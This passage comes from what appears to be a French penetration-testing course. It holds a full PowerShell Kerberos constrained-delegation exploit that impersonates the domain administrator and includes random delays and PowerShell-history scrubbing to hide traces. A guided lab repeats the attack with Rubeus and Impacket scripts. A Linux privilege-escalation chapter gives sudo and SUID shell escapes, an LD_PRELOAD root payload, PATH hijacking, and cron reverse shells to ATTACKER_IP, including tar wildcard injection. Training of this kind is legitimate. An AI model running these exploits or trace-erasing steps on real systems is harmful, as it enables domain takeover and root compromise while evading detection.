                    Write-Log "First 5 items: $($Files | ForEach-Object { $_.Name })" -Level "INFO"
                    return $true
                }
                else {
                    Write-Log "Failed to access $TestPath" -Level "WARNING"
                    return $false
                }
            }
            "ldap" {
                $SearchBase = "DC=" + ($TargetDomain -replace "\.", ",DC=")
                $Result = Get-DomainUser -Identity "administrator" -Domain $TargetDomain -Server $ServiceHost -ErrorAction SilentlyContinue
                if ($Result) {
                    Write-Log "Successfully queried LDAP on $ServiceHost" -Level "SUCCESS"
                    return $true
                }
                else {
                    Write-Log "Failed to query LDAP on $ServiceHost" -Level "WARNING"
                    return $false
                }
            }
            default {
                Write-Log "No test implemented for service type $ServiceType" -Level "WARNING"
                return $false
            }
        }
    }
    catch {
        Write-Log "Error testing access: $_" -Level "ERROR"
        return $false
    }
}

# Fonction pour nettoyer après l'exploitation
function Invoke-Cleanup {
    Write-Log "Performing cleanup..." -Level "INFO"
    
    # Supprimer les tickets Kerberos de la session
    try {
        klist purge | Out-Null
        Write-Log "Kerberos tickets purged" -Level "SUCCESS"
    }
    catch {
        Write-Log "Error purging Kerberos tickets: $_" -Level "WARNING"
    }
    
    # Nettoyer les variables sensibles
    $script:TargetPassword = $null
    $script:PlainPassword = $null
    [System.GC]::Collect()
    
    # Nettoyer l'historique PowerShell
    if (Test-Path (Get-PSReadlineOption).HistorySavePath) {
        $HistoryPath = (Get-PSReadlineOption).HistorySavePath
        $History = Get-Content $HistoryPath
        $CleanHistory = $History | Where-Object { 
            -not ($_ -match "Rubeus" -or $_ -match "password" -or $_ -match "hash" -or $_ -match "ticket") 
        }
        Set-Content $HistoryPath $CleanHistory
        Write-Log "PowerShell history cleaned" -Level "SUCCESS"
    }
    
    Write-Log "Cleanup completed" -Level "SUCCESS"
}

# Fonction principale
function Invoke-DiscreteConstrainedDelegationExploit {
    Write-Log "Starting discrete constrained delegation exploitation" -Level "INFO"
    
    # Vérifier les prérequis
    if (-not (Test-Prerequisites)) {
        Write-Log "Prerequisites check failed. Aborting." -Level "ERROR"
        return
    }
    
    Invoke-RandomDelay
    
    # Identifier les cibles potentielles
    $DelegationTargets = Find-ConstrainedDelegationTargets
    if (-not $DelegationTargets) {
        Write-Log "No suitable targets found. Aborting." -Level "ERROR"
        return
    }
    
    Invoke-RandomDelay
    
    # Sélectionner une cible optimale
    $SelectedTarget = Select-OptimalTarget -Targets $DelegationTargets
    
    Invoke-RandomDelay
    
    # Analyser les services délégués
    $SelectedService = Get-DelegatedServices -Target $SelectedTarget
    if (-not $SelectedService) {
        Write-Log "No suitable services found. Aborting." -Level "ERROR"
        return
    }
    
    Invoke-RandomDelay
    
    # Exploiter la délégation contrainte
    $ExploitSuccess = Exploit-ConstrainedDelegation -Target $SelectedTarget -Service $SelectedService
    if (-not $ExploitSuccess) {
        Write-Log "Exploitation failed. Aborting." -Level "ERROR"
        Invoke-Cleanup
        return
    }
    
    Invoke-RandomDelay
    
    # Tester l'accès obtenu
    $ServiceParts = $SelectedService -split "/"
    $ServiceType = $ServiceParts[0]
    $ServiceHost = $ServiceParts[1]
    $TestSuccess = Test-ExploitSuccess -ServiceHost $ServiceHost -ServiceType $ServiceType
    
    if ($TestSuccess) {
        Write-Log "Exploitation and access test successful!" -Level "SUCCESS"
    }
    else {
        Write-Log "Access test failed despite successful exploitation" -Level "WARNING"
    }
    
    # Nettoyer
    Invoke-RandomDelay
    Invoke-Cleanup
    
    Write-Log "Discrete constrained delegation exploitation completed" -Level "SUCCESS"
}

# Exécution du script principal
Invoke-DiscreteConstrainedDelegationExploit
```

### Points clés

- Les techniques avancées d'exploitation d'Active Directory ciblent les mécanismes de confiance et de délégation, les services de certificats, et les relations entre domaines et forêts.
- La délégation Kerberos (contrainte, non contrainte, RBCD) peut être abusée pour usurper l'identité d'utilisateurs privilégiés.
- Les services de certificats (ADCS) peuvent être exploités pour obtenir des certificats permettant l'authentification en tant qu'utilisateurs privilégiés.
- Les attaques de forêt et de domaine (DCSync, DCShadow) permettent d'extraire des informations sensibles ou de modifier des objets AD de manière discrète.
- Les techniques de persistance avancées (Golden Ticket, Silver Ticket, Diamond Ticket, Skeleton Key) permettent de maintenir un accès privilégié même après des changements de mots de passe.
- Les équipes défensives peuvent détecter ces techniques via l'analyse des logs d'authentification Kerberos, des modifications d'objets AD, et des comportements anormaux.
- Une exploitation AD discrète nécessite une planification minutieuse, une limitation des requêtes, un timing approprié, et un nettoyage rigoureux.

### Mini-quiz (3 QCM)

1. **Quelle technique d'attaque permet d'obtenir un ticket Kerberos pour n'importe quel service du domaine en utilisant le hash NTLM du compte krbtgt ?**
   - A) Silver Ticket
   - B) Golden Ticket
   - C) Diamond Ticket
   - D) Skeleton Key

   *Réponse : B*

2. **Quelle vulnérabilité d'ADCS permet d'obtenir un certificat pour un utilisateur privilégié en exploitant un modèle de certificat mal configuré ?**
   - A) ESC1
   - B) ESC4
   - C) ESC8
   - D) RBCD

   *Réponse : A*

3. **Quelle technique permet à un service de s'authentifier auprès d'autres services spécifiques au nom d'un utilisateur ?**
   - A) Délégation non contrainte
   - B) Délégation contrainte
   - C) Délégation basée sur les ressources
   - D) Délégation transitive

   *Réponse : B*

### Lab/Exercice guidé : Exploitation de délégation contrainte

#### Objectif
Identifier et exploiter une configuration de délégation contrainte pour obtenir un accès privilégié à un service spécifique.

#### Prérequis
- Environnement Active Directory avec au moins un contrôleur de domaine
- Un compte avec délégation contrainte configurée
- Accès au mot de passe ou hash NTLM de ce compte
- Rubeus (pour l'exploitation sur Windows) ou Impacket (pour l'exploitation sur Linux)

#### Étapes

1. **Préparation de l'environnement**

```powershell
# Sur une machine Windows avec PowerView chargé
# Créer un dossier de travail
$WorkDir = "C:\AD-Lab"
New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
Set-Location $WorkDir

# Fonction de logging
function Write-LabLog {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Message,
        [string]$Level = "INFO"
    )
    
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogEntry = "[$Timestamp] [$Level] $Message"
    
    # Logging local
    Add-Content -Path "$WorkDir\lab.log" -Value $LogEntry
    
    # Affichage console
    switch ($Level) {
        "INFO" { Write-Host $LogEntry -ForegroundColor Cyan }
        "SUCCESS" { Write-Host $LogEntry -ForegroundColor Green }
        "WARNING" { Write-Host $LogEntry -ForegroundColor Yellow }
        "ERROR" { Write-Host $LogEntry -ForegroundColor Red }
        default { Write-Host $LogEntry }
    }
}

Write-LabLog "Starting Constrained Delegation Lab" -Level "INFO"
```

2. **Identification des cibles de délégation contrainte**

```powershell
# Recherche des comptes avec délégation contrainte configurée
Write-LabLog "Searching for accounts with constrained delegation..." -Level "INFO"

# Avec PowerView
$DelegationUsers = Get-DomainUser -TrustedToAuth
$DelegationComputers = Get-DomainComputer -TrustedToAuth

# Ou avec AD Module
# $DelegationUsers = Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
# $DelegationComputers = Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# Combiner les résultats
$DelegationTargets = @()
$DelegationTargets += $DelegationUsers
$DelegationTargets += $DelegationComputers

if ($DelegationTargets.Count -eq 0) {
    Write-LabLog "No accounts with constrained delegation found. Please configure at least one account for the lab." -Level "ERROR"
    return
}

Write-LabLog "Found $($DelegationTargets.Count) accounts with constrained delegation" -Level "SUCCESS"

# Afficher les détails des cibles
foreach ($Target in $DelegationTargets) {
    Write-LabLog "Account: $($Target.samaccountname)" -Level "INFO"
    Write-LabLog "Allowed Services:" -Level "INFO"
    foreach ($Service in $Target.'msDS-AllowedToDelegateTo') {
        Write-LabLog "  - $Service" -Level "INFO"
    }
    Write-LabLog "------------------------" -Level "INFO"
}

# Sélectionner une cible pour l'exploitation
$SelectedTarget = $DelegationTargets[0]
Write-LabLog "Selected target for exploitation: $($SelectedTarget.samaccountname)" -Level "SUCCESS"
```

3. **Analyse des services délégués**

```powershell
# Analyser les services auxquels la cible peut déléguer
Write-LabLog "Analyzing delegated services for $($SelectedTarget.samaccountname)..." -Level "INFO"

$DelegatedServices = $SelectedTarget.'msDS-AllowedToDelegateTo'

if ($DelegatedServices.Count -eq 0) {
    Write-LabLog "No delegated services found. Please check the configuration." -Level "ERROR"
    return
}

# Prioriser les services critiques
$PriorityServices = @()
foreach ($Service in $DelegatedServices) {
    if ($Service -like "*cifs/*" -or $Service -like "*ldap/*" -or $Service -like "*host/*") {
        $PriorityServices += $Service
    }
}

if ($PriorityServices.Count -gt 0) {
    $SelectedService = $PriorityServices[0]
    Write-LabLog "Selected priority service: $SelectedService" -Level "SUCCESS"
}
else {
    $SelectedService = $DelegatedServices[0]
    Write-LabLog "No priority services found, selected: $SelectedService" -Level "WARNING"
}

# Extraire les informations du service
$ServiceParts = $SelectedService -split "/"
$ServiceType = $ServiceParts[0]
$ServiceHost = $ServiceParts[1]

Write-LabLog "Service Type: $ServiceType" -Level "INFO"
Write-LabLog "Service Host: $ServiceHost" -Level "INFO"
```

4. **Exploitation avec Rubeus (Windows)**

```powershell
# Exploitation de la délégation contrainte avec Rubeus
Write-LabLog "Preparing to exploit constrained delegation with Rubeus..." -Level "INFO"

# Vérifier si Rubeus est disponible
$RubeusPath = "$WorkDir\Rubeus.exe"
if (-not (Test-Path $RubeusPath)) {
    Write-LabLog "Rubeus not found at $RubeusPath. Please download it." -Level "ERROR"
    return
}

# Obtenir les informations d'authentification pour le compte cible
$TargetAccount = $SelectedTarget.samaccountname
$TargetPassword = Read-Host "Enter password for $TargetAccount" -AsSecureString
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($TargetPassword)
$PlainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

# Utilisateur à usurper
$ImpersonateUser = "administrator"
Write-LabLog "Will impersonate user: $ImpersonateUser" -Level "INFO"

# Étape 1: Demander un TGT pour le compte avec délégation
Write-LabLog "Step 1: Requesting TGT for $TargetAccount..." -Level "INFO"
$TgtCommand = "asktgt /user:$TargetAccount /password:$PlainPassword /nowrap"
$TgtResult = & $RubeusPath $TgtCommand.Split(" ")

# Extraire le ticket de la sortie
$TgtTicket = $TgtResult | Where-Object { $_ -match "doIFuj" } | Select-Object -First 1
if (-not $TgtTicket) {
    Write-LabLog "Failed to obtain TGT. Check credentials and try again." -Level "ERROR"
    return
}

Write-LabLog "TGT obtained successfully" -Level "SUCCESS"

# Étape 2: S4U2self - Demander un TGS pour l'utilisateur cible
Write-LabLog "Step 2: Performing S4U2self to request TGS for $ImpersonateUser..." -Level "INFO"
$S4u2selfCommand = "s4u /ticket:$TgtTicket /impersonateuser:$ImpersonateUser /nowrap"
$S4u2selfResult = & $RubeusPath $S4u2selfCommand.Split(" ")

# Extraire le ticket de la sortie
$S4u2selfTicket = $S4u2selfResult | Where-Object { $_ -match "doIFmj" } | Select-Object -First 1
if (-not $S4u2selfTicket) {
    Write-LabLog "Failed to perform S4U2self. Check permissions and try again." -Level "ERROR"
    return
}

Write-LabLog "S4U2self completed successfully" -Level "SUCCESS"

# Étape 3: S4U2proxy - Convertir le TGS en ticket pour le service cible
Write-LabLog "Step 3: Performing S4U2proxy to request TGS for $SelectedService..." -Level "INFO"
$S4u2proxyCommand = "s4u /ticket:$TgtTicket /impersonateuser:$ImpersonateUser /msdsspn:$SelectedService /nowrap"
$S4u2proxyResult = & $RubeusPath $S4u2proxyCommand.Split(" ")

# Extraire le ticket de la sortie
$S4u2proxyTicket = $S4u2proxyResult | Where-Object { $_ -match "doIFmj" } | Select-Object -First 1
if (-not $S4u2proxyTicket) {
    Write-LabLog "Failed to perform S4U2proxy. Check delegation configuration and try again." -Level "ERROR"
    return
}

Write-LabLog "S4U2proxy completed successfully" -Level "SUCCESS"

# Étape 4: Utiliser le ticket obtenu
Write-LabLog "Step 4: Importing ticket into current session..." -Level "INFO"
$PttCommand = "ptt /ticket:$S4u2proxyTicket"
$PttResult = & $RubeusPath $PttCommand.Split(" ")

if ($PttResult -match "Ticket successfully imported") {
    Write-LabLog "Ticket imported successfully" -Level "SUCCESS"
}
else {
    Write-LabLog "Failed to import ticket. Check the following output:" -Level "WARNING"
    $PttResult | ForEach-Object { Write-LabLog $_ -Level "INFO" }
    return
}

# Nettoyer les variables sensibles
$PlainPassword = $null
[System.GC]::Collect()
```

5. **Exploitation avec Impacket (Linux)**

```bash
#!/bin/bash
# Script d'exploitation de délégation contrainte avec Impacket

# Configuration
WORK_DIR="/tmp/ad-lab"
LOG_FILE="$WORK_DIR/lab.log"
TARGET_DOMAIN="domain.local"

# Créer le répertoire de travail
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# Fonction de logging
log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
    
    case "$level" in
        "INFO")
            echo -e "\e[36m[$timestamp] [$level] $message\e[0m"
            ;;
        "SUCCESS")
            echo -e "\e[32m[$timestamp] [$level] $message\e[0m"
            ;;
        "WARNING")
            echo -e "\e[33m[$timestamp] [$level] $message\e[0m"
            ;;
        "ERROR")
            echo -e "\e[31m[$timestamp] [$level] $message\e[0m"
            ;;
        *)
            echo "[$timestamp] [$level] $message"
            ;;
    esac
}

log "INFO" "Starting Constrained Delegation Lab with Impacket"

# Vérifier si Impacket est installé
if ! command -v getST.py &> /dev/null; then
    log "ERROR" "Impacket tools not found. Please install Impacket."
    exit 1
fi

# Demander les informations nécessaires
read -p "Enter account with constrained delegation (e.g., SERVICE$): " TARGET_ACCOUNT
read -s -p "Enter password for $TARGET_ACCOUNT: " TARGET_PASSWORD
echo
read -p "Enter service to target (e.g., cifs/server.domain.local): " TARGET_SERVICE
read -p "Enter user to impersonate (default: administrator): " IMPERSONATE_USER
IMPERSONATE_USER=${IMPERSONATE_USER:-administrator}

# Extraire les informations du service
SERVICE_TYPE=$(echo "$TARGET_SERVICE" | cut -d'/' -f1)
SERVICE_HOST=$(echo "$TARGET_SERVICE" | cut -d'/' -f2)

log "INFO" "Target Account: $TARGET_ACCOUNT"
log "INFO" "Service Type: $SERVICE_TYPE"
log "INFO" "Service Host: $SERVICE_HOST"
log "INFO" "User to Impersonate: $IMPERSONATE_USER"

# Exploitation avec getST.py
log "INFO" "Exploiting constrained delegation with getST.py..."
getST.py -spn "$TARGET_SERVICE" -impersonate "$IMPERSONATE_USER" "$TARGET_DOMAIN/$TARGET_ACCOUNT:$TARGET_PASSWORD" -debug

if [ $? -ne 0 ]; then
    log "ERROR" "Failed to exploit constrained delegation. Check the output above."
    exit 1
fi

# Définir la variable d'environnement KRB5CCNAME
export KRB5CCNAME="$IMPERSONATE_USER.ccache"
log "SUCCESS" "Ticket obtained and stored in $KRB5CCNAME"

# Tester l'accès obtenu
log "INFO" "Testing access to $SERVICE_TYPE on $SERVICE_HOST..."

case "$SERVICE_TYPE" in
    "cifs")
        log "INFO" "Testing SMB access..."
        smbclient.py -k "$TARGET_DOMAIN/$IMPERSONATE_USER@$SERVICE_HOST"
        if [ $? -eq 0 ]; then
            log "SUCCESS" "SMB access successful!"
        else
            log "WARNING" "SMB access failed despite successful ticket acquisition."
        fi
        ;;
    "ldap")
        log "INFO" "Testing LDAP access..."
        ldapsearch -Y GSSAPI -H "ldap://$SERVICE_HOST" -b "DC=${TARGET_DOMAIN//./,DC=}" -s sub "(sAMAccountName=administrator)" | grep "dn:"
        if [ $? -eq 0 ]; then
            log "SUCCESS" "LDAP access successful!"
        else
            log "WARNING" "LDAP access failed despite successful ticket acquisition."
        fi
        ;;
    *)
        log "WARNING" "No test implemented for service type $SERVICE_TYPE"
        ;;
esac

# Nettoyage
log "INFO" "Cleaning up..."
unset TARGET_PASSWORD
kdestroy
log "SUCCESS" "Lab completed"
```

6. **Test de l'accès obtenu**

```powershell
# Tester l'accès obtenu
Write-LabLog "Testing access to $ServiceType on $ServiceHost..." -Level "INFO"

try {
    switch ($ServiceType.ToLower()) {
        "cifs" {
            $TestPath = "\\$ServiceHost\C$"
            if (Test-Path $TestPath) {
                Write-LabLog "Successfully accessed $TestPath" -Level "SUCCESS"
                $Files = Get-ChildItem -Path $TestPath -ErrorAction SilentlyContinue | Select-Object -First 5
                Write-LabLog "First 5 items: $($Files | ForEach-Object { $_.Name })" -Level "INFO"
            }
            else {
                Write-LabLog "Failed to access $TestPath" -Level "WARNING"
            }
        }
        "ldap" {
            $SearchBase = "DC=" + ($env:USERDNSDOMAIN -replace "\.", ",DC=")
            $Result = Get-DomainUser -Identity "administrator" -SearchBase $SearchBase -Server $ServiceHost -ErrorAction SilentlyContinue
            if ($Result) {
                Write-LabLog "Successfully queried LDAP on $ServiceHost" -Level "SUCCESS"
                Write-LabLog "Administrator SID: $($Result.objectsid)" -Level "INFO"
            }
            else {
                Write-LabLog "Failed to query LDAP on $ServiceHost" -Level "WARNING"
            }
        }
        default {
            Write-LabLog "No test implemented for service type $ServiceType" -Level "WARNING"
        }
    }
}
catch {
    Write-LabLog "Error testing access: $_" -Level "ERROR"
}
```

7. **Nettoyage**

```powershell
# Nettoyage
Write-LabLog "Performing cleanup..." -Level "INFO"

# Supprimer les tickets Kerberos de la session
klist purge | Out-Null
Write-LabLog "Kerberos tickets purged" -Level "SUCCESS"

# Nettoyer les variables sensibles
$script:TargetPassword = $null
$script:PlainPassword = $null
[System.GC]::Collect()

Write-LabLog "Lab completed" -Level "SUCCESS"
```

#### Vue Blue Team

Dans un environnement réel, cette exploitation de délégation contrainte générerait des traces détectables :

1. **Logs générés**
   - Événements d'authentification Kerberos (4768, 4769)
   - Utilisation de S4U2self et S4U2proxy
   - Accès aux ressources avec des identités usurpées

2. **Alertes potentielles**
   - Détection d'impersonation d'utilisateurs privilégiés
   - Utilisation inhabituelle de délégation contrainte
   - Accès à des ressources sensibles depuis des sources inhabituelles

3. **Contre-mesures possibles**
   - Surveillance des événements Kerberos liés à la délégation
   - Restriction des comptes pouvant être délégués (Protected Users)
   - Limitation des services auxquels la délégation est autorisée

#### Techniques OPSEC appliquées

1. **Limitation du bruit**
   - Ciblage d'un seul service spécifique plutôt que de multiples services
   - Utilisation d'un seul compte avec délégation plutôt que de tester tous les comptes
   - Limitation des accès aux ressources après exploitation

2. **Timing approprié**
   - Exécution pendant les heures normales de travail
   - Espacement des différentes étapes de l'exploitation

3. **Nettoyage**
   - Suppression des tickets Kerberos après utilisation
   - Nettoyage des variables sensibles
   - Effacement des traces dans l'historique PowerShell

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir identifié un compte avec délégation contrainte configurée
- Avoir exploité cette configuration pour usurper l'identité d'un utilisateur privilégié
- Avoir accédé à un service spécifique avec les privilèges de l'utilisateur usurpé
- Comprendre les traces générées par cette exploitation et comment les minimiser
- Apprécier l'importance de la configuration sécurisée de la délégation Kerberos
# PARTIE III : COMPÉTENCES OSCP AVANCÉES (+ OPSEC NIVEAU 3)

## Chapitre 16 : PrivEsc Linux

### Introduction : Pourquoi ce thème est important

L'élévation de privilèges (Privilege Escalation, PrivEsc) sur les systèmes Linux est une étape cruciale dans la plupart des scénarios de test d'intrusion. Après avoir obtenu un accès initial avec des privilèges limités, l'objectif est d'obtenir des privilèges plus élevés, idéalement ceux de l'utilisateur `root`, pour prendre le contrôle total du système. Ce chapitre explore diverses techniques d'élévation de privilèges sur Linux, allant des configurations incorrectes courantes aux vulnérabilités du noyau, en passant par l'exploitation de services et de scripts. La maîtrise de ces techniques est fondamentale pour réussir l'examen OSCP et pour mener à bien des pentests réalistes, car l'accès `root` ouvre la voie à la persistance, au mouvement latéral et à l'exfiltration de données sensibles.

### Énumération initiale

Une énumération approfondie est la clé pour identifier les vecteurs potentiels d'élévation de privilèges. Il est essentiel de collecter autant d'informations que possible sur le système cible.

#### Informations système de base

1. **Version du noyau et distribution**
   - Identifier la version du noyau peut révéler des vulnérabilités connues (Kernel Exploits)
   - Connaître la distribution aide à comprendre la configuration par défaut et les outils disponibles
   
   ```bash
   uname -a
   cat /etc/os-release
   lsb_release -a
   cat /etc/issue
   ```

2. **Utilisateur actuel et privilèges**
   - Connaître l'utilisateur actuel et ses groupes
   - Vérifier les privilèges `sudo`
   
   ```bash
   whoami
   id
   sudo -l
   ```

3. **Informations réseau**
   - Identifier les interfaces réseau, les connexions actives et les services en écoute
   - Peut révéler des services mal configurés ou des chemins de communication
   
   ```bash
   ip addr
   ip route
   ss -tulnp
   netstat -tulnp
   ```

#### Recherche de fichiers et de configurations sensibles

1. **Fichiers avec SUID/SGID**
   - Les binaires SUID/SGID s'exécutent avec les privilèges du propriétaire/groupe, pas de l'utilisateur qui les lance
   - Des binaires SUID `root` mal configurés ou vulnérables sont un vecteur courant de PrivEsc
   
   ```bash
   # Recherche des binaires SUID (exécution en tant que propriétaire)
   find / -type f -perm -4000 -ls 2>/dev/null
   
   # Recherche des binaires SGID (exécution en tant que groupe)
   find / -type f -perm -2000 -ls 2>/dev/null
   ```

2. **Fichiers accessibles en écriture par l'utilisateur actuel**
   - Identifier les fichiers ou répertoires importants (scripts, configurations) modifiables par l'utilisateur
   - Peut permettre de modifier des scripts exécutés par `root` ou d'altérer des configurations
   
   ```bash
   find / -writable -type f 2>/dev/null
   find / -perm -o+w -type d 2>/dev/null
   find /etc/ -writable -type f 2>/dev/null
   ```

3. **Fichiers de configuration sensibles**
   - Recherche de mots de passe en clair, de clés SSH, de configurations de services
   
   ```bash
   grep -i "password" /etc/* /var/log/* -R 2>/dev/null
   find / -name "*.conf" -exec grep -i "password" {} \; -print 2>/dev/null
   ls -al ~/.ssh/
   cat ~/.bash_history
   cat /etc/passwd
   cat /etc/shadow # (nécessite des privilèges root)
   ```

#### Énumération des processus et services

1. **Processus en cours d'exécution**
   - Identifier les processus exécutés par `root` ou d'autres utilisateurs privilégiés
   - Peut révéler des services vulnérables ou des scripts personnalisés
   
   ```bash
   ps aux
   ps -ef
   top -n 1
   ```

2. **Tâches planifiées (Cron Jobs)**
   - Les tâches cron exécutées par `root` qui interagissent avec des fichiers ou scripts modifiables par l'utilisateur sont un vecteur de PrivEsc
   
   ```bash
   ls -al /etc/cron*
   cat /etc/crontab
   cat /etc/cron.d/*
   cat /var/spool/cron/crontabs/*
   ```

3. **Services et timers Systemd**
   - Identifier les services et timers systemd, en particulier ceux qui exécutent des scripts ou interagissent avec des fichiers modifiables
   
   ```bash
   systemctl list-units --type=service
   systemctl list-timers --all
   ls -al /etc/systemd/system/
   ls -al /usr/lib/systemd/system/
   ```

#### Utilisation de scripts d'énumération automatisée

Plusieurs scripts automatisent le processus d'énumération et aident à identifier rapidement les vecteurs potentiels.

1. **LinEnum.sh**
   - Script shell complet qui collecte une grande quantité d'informations système
   
   ```bash
   # Télécharger et exécuter
   wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
   chmod +x LinEnum.sh
   ./LinEnum.sh -t # (-t pour rapport complet)
   ```

2. **LinPEAS.sh**
   - Script axé sur la recherche de vecteurs de PrivEsc, avec des couleurs pour mettre en évidence les résultats intéressants
   
   ```bash
   # Télécharger et exécuter
   wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
   chmod +x linpeas.sh
   ./linpeas.sh
   ```

3. **LES (Linux Exploit Suggester)**
   - Script qui compare la version du noyau avec une base de données d'exploits connus
   
   ```bash
   # Télécharger et exécuter
   wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
   chmod +x linux-exploit-suggester.sh
   ./linux-exploit-suggester.sh
   ```

### Exploitation des configurations incorrectes

#### Abus de `sudo`

1. **`sudo -l` sans mot de passe**
   - Si l'utilisateur peut exécuter `sudo -l` sans mot de passe, cela révèle les commandes qu'il peut exécuter en tant que `root`
   
   ```bash
   sudo -l
   ```

2. **Commandes `sudo` permettant l'évasion**
   - Certaines commandes autorisées via `sudo` peuvent être utilisées pour obtenir un shell `root` (ex: `find`, `nmap`, `vim`, `less`, `awk`, etc.)
   - GTFOBins (https://gtfobins.github.io/) est une ressource essentielle pour identifier ces évasions
   
   ```bash
   # Exemple avec find
   sudo find . -exec /bin/sh \; -quit
   
   # Exemple avec nmap (mode interactif)
   sudo nmap --interactive
   # Puis taper !sh
   
   # Exemple avec awk
   sudo awk 'BEGIN {system("/bin/sh")}'
   ```

3. **Variables d'environnement `sudo` (LD_PRELOAD, LD_LIBRARY_PATH)**
   - Si la configuration `sudoers` préserve certaines variables d'environnement (`env_keep`), elles peuvent être abusées
   - `LD_PRELOAD` permet de charger une bibliothèque partagée avant les autres, permettant de détourner des fonctions
   
   ```bash
   # Vérifier si LD_PRELOAD est préservé
   sudo -l | grep LD_PRELOAD
   
   # Si oui, créer une bibliothèque malveillante (payload.c)
   #include <stdio.h>
   #include <stdlib.h>
   #include <unistd.h>
   
   void _init() {
       unsetenv("LD_PRELOAD");
       setuid(0);
       setgid(0);
       system("/bin/bash");
   }
   
   # Compiler la bibliothèque
   gcc -shared -fPIC -o payload.so payload.c -nostartfiles
   
   # Exécuter une commande sudo autorisée en préchargeant la bibliothèque
   sudo LD_PRELOAD=$(pwd)/payload.so find
   ```

#### Exploitation des fichiers SUID/SGID

1. **Binaires SUID connus avec vulnérabilités**
   - Certains binaires SUID `root` ont des vulnérabilités connues permettant l'évasion (ex: anciennes versions de `nmap`, `find`, etc.)
   - Utiliser GTFOBins pour identifier les évasions possibles
   
   ```bash
   # Si 'find' est SUID root
   find . -exec /bin/sh -p \; -quit # (-p pour conserver les privilèges SUID)
   ```

2. **Écrasement de fichiers lus par des binaires SUID**
   - Si un binaire SUID `root` lit un fichier contrôlé par l'utilisateur, ce fichier peut être remplacé par un lien symbolique vers un fichier sensible (ex: `/etc/shadow`)
   
   ```bash
   # Exemple: binaire SUID 'read_config' lit /home/user/config.txt
   ln -sf /etc/shadow /home/user/config.txt
   ./read_config # Le contenu de /etc/shadow sera lu/affiché
   ```

3. **Abus de variables d'environnement (PATH)**
   - Si un binaire SUID `root` appelle une autre commande sans spécifier son chemin absolu, la variable `PATH` peut être manipulée pour exécuter un binaire malveillant
   
   ```bash
   # Exemple: binaire SUID 'run_script' exécute 'service apache2 start'
   
   # Créer un script malveillant nommé 'service'
   echo '#!/bin/bash' > /tmp/service
   echo '/bin/bash -p' >> /tmp/service
   chmod +x /tmp/service
   
   # Modifier le PATH
   export PATH=/tmp:$PATH
   
   # Exécuter le binaire SUID
   ./run_script # Exécutera /tmp/service au lieu de /usr/sbin/service
   ```

#### Exploitation des tâches Cron

1. **Scripts Cron modifiables**
   - Si une tâche cron exécutée par `root` utilise un script modifiable par l'utilisateur, le script peut être modifié pour ajouter une commande malveillante (ex: reverse shell)
   
   ```bash
   # Tâche Cron: * * * * * root /path/to/script.sh
   # Si /path/to/script.sh est modifiable par l'utilisateur
   echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /path/to/script.sh
   # Attendre l'exécution de la tâche cron
   ```

2. **Jokers dans les tâches Cron (Wildcard Injection)**
   - Si une tâche cron utilise des jokers (`*`) dans des commandes comme `tar` ou `chown` sur des répertoires où l'utilisateur peut créer des fichiers, cela peut être exploité
   
   ```bash
   # Tâche Cron: * * * * * root tar czf /backup/archive.tgz /home/user/data/*
   
   # Créer des fichiers malveillants dans /home/user/data/
   cd /home/user/data/
   touch -- "--checkpoint=1"
   touch -- "--checkpoint-action=exec=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"
   # Lorsque tar s'exécute, il interprétera ces noms de fichiers comme des options
   ```

3. **PATH non sécurisé dans les tâches Cron**
   - Si le `PATH` utilisé par cron est mal configuré et inclut des répertoires modifiables par l'utilisateur, cela peut être exploité comme pour les binaires SUID
   
   ```bash
   # Vérifier le PATH dans /etc/crontab ou les scripts cron
   # Si /tmp est dans le PATH et qu'un script cron exécute 'backup_script'
   echo '#!/bin/bash' > /tmp/backup_script
   echo '/bin/bash -p' >> /tmp/backup_script
   chmod +x /tmp/backup_script
   # Attendre l'exécution de la tâche cron
   ```

#### Capacités Linux (Capabilities)

1. **Principes des capacités**
   - Mécanisme permettant de diviser les privilèges `root` en unités plus petites (capacités)
   - Un binaire peut avoir des capacités spécifiques sans être SUID `root`
   - `getcap` permet de lister les capacités d'un fichier

2. **Identification des binaires avec capacités**
   
   ```bash
   getcap -r / 2>/dev/null
   ```

3. **Exploitation des capacités dangereuses**
   - Certaines capacités peuvent être directement utilisées pour obtenir des privilèges `root` (ex: `cap_sys_admin`, `cap_setuid`, `cap_dac_read_search`)
   
   ```bash
   # Exemple: Si /usr/bin/python a cap_setuid+ep
   /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
   
   # Exemple: Si /usr/bin/perl a cap_setuid+ep
   /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
   ```

### Exploitation des services et applications

#### Services réseau locaux (localhost)

1. **Services écoutant sur 127.0.0.1**
   - Certains services (bases de données, serveurs web de développement) peuvent écouter uniquement sur localhost et être vulnérables
   - L'accès initial permet d'interagir avec ces services
   
   ```bash
   ss -lntp | grep 127.0.0.1
   netstat -lntp | grep 127.0.0.1
   ```

2. **Exploitation de bases de données locales**
   - MySQL, PostgreSQL, etc., peuvent contenir des informations sensibles ou permettre l'exécution de commandes via des UDF (User Defined Functions)
   
   ```bash
   # Connexion à MySQL sans mot de passe (si configuré)
   mysql -u root
   
   # Recherche de mots de passe dans les tables
   SELECT User, Host, Password FROM mysql.user;
   
   # Exploitation via UDF (si possible)
   SELECT sys_exec('id');
   ```

3. **Exploitation de serveurs web locaux**
   - Serveurs web de développement ou d'administration écoutant sur localhost
